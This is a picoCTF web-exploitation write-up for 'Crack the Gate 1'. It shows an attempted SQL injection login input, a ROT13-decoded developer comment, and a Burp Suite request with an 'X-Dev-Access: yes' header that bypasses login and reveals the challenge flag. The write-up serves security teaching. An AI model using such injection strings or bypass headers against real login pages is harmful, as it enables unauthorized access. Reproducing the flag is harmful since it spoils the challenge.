# picoCTF Writeup: Crack the Gate 1

**Challenge Name:** Crack the Gate 1  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Author:** Yahaya Meddy

---

## üìå Challenge Description

We're in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off... it's almost like the developer left a secret way in. Can you figure it out?

Additional details will be available after launching your challenge instance.

---

## üéØ Objective

Bypass the login authentication and retrieve the flag from the restricted web portal.

---

## üîç Initial Analysis

The challenge provides:

- A website link: http://amiable-citadel.picoctf.net:52950/
- An email for login: ctf-player@picoctf.org

**Required Skills:**

- Web exploitation fundamentals
- Understanding of ROT13 cipher
- HTTP header manipulation
- Burp Suite usage
- Source code analysis

---

## üìÑ Web Analysis

The provided website contains a login page requiring an email and password.

**Key Observations:**

- Standard login form with email and password fields
- Input validation prevents special characters after the @ symbol in email
- Potential hidden clues in the source code

---

## üõ†Ô∏è Solution Steps

### Step 1: Access the Website

I accessed the provided website using the link: http://amiable-citadel.picoctf.net:52950/

The page displayed a standard login interface.

### Step 2: Attempt SQL Injection

The first approach I tried was a simple SQL injection technique using the comment operator `--`.

I entered:

- Email: `ctf-player@picoctf.org'--`
- Password: (random value)

This method didn't work because the web application prevents any symbols from being added after the @ sign in the email input field.

### Step 3: Inspect the Source Code

I used the "View Page Source" option and discovered something important in the HTML comments:

```html
<body>
  <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
  <!-- Remove before pushing to production! -->
</body>
```

I recognized this as some kind of encryption or encoding.

### Step 4: Decrypt the Clue

I used https://www.dcode.fr/cipher-identifier to quickly identify the algorithm used for this encryption, and found it matched with the **ROT13 cipher**.

After decoding it, I got this message:

```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

### Step 5: HTTP Header Modification

After obtaining the clue, I opened Burp Suite to intercept the request when clicking the login button. The original request looked like this:

```http
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:62257
Content-Length: 60
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:62257
Referer: http://amiable-citadel.picoctf.net:62257/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"ctf-player@picoctf.org","password":"343243243434"}
```

I modified the request by adding the custom header:

```http
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:62257
Content-Length: 60
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:62257
Referer: http://amiable-citadel.picoctf.net:62257/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
X-Dev-Access: yes 

{"email":"ctf-player@picoctf.org","password":"343243243434"}
```

I clicked "Forward" in Burp Suite, and received a JavaScript alert displaying the flag.

---

## üö© Flag

```
picoCTF{brut4_f0rc4_7e5db33b}
```

---

## üí° Key Takeaways

This challenge reinforces fundamental web exploitation concepts:

1. **Source Code Analysis:** Always inspect the HTML source code‚Äîdevelopers sometimes leave debugging comments or sensitive information
2. **Cipher Recognition:** Understanding classic ciphers like ROT13 and being able to identify them quickly
3. **HTTP Header Manipulation:** Learning how custom HTTP headers can bypass authentication mechanisms
4. **Developer Oversight:** Recognizing that developers may leave debugging features enabled in production environments
5. **Proxy Tools Mastery:** Understanding how to use tools like Burp Suite to intercept and modify HTTP requests
6. **Security Misconfiguration:** Identifying common security misconfigurations such as exposed developer bypass mechanisms

---

## üîß Tools & Techniques Used

| Tool/Technique   | Purpose                            | Method                          |
| ---------------- | ---------------------------------- | ------------------------------- |
| Web Browser      | Access the challenge website       | Chrome/Firefox                  |
| Browser DevTools | Inspect page source                | F12 / Right-click ‚Üí View Source |
| dCode.fr         | Identify and decode ROT13 cipher   | Online tool                     |
| Burp Suite       | Intercept and modify HTTP requests | Proxy interception              |
| ROT13 Decoder    | Decrypt the hidden message         | Cryptography                    |

---

**Challenge Completed Successfully! üéâ**
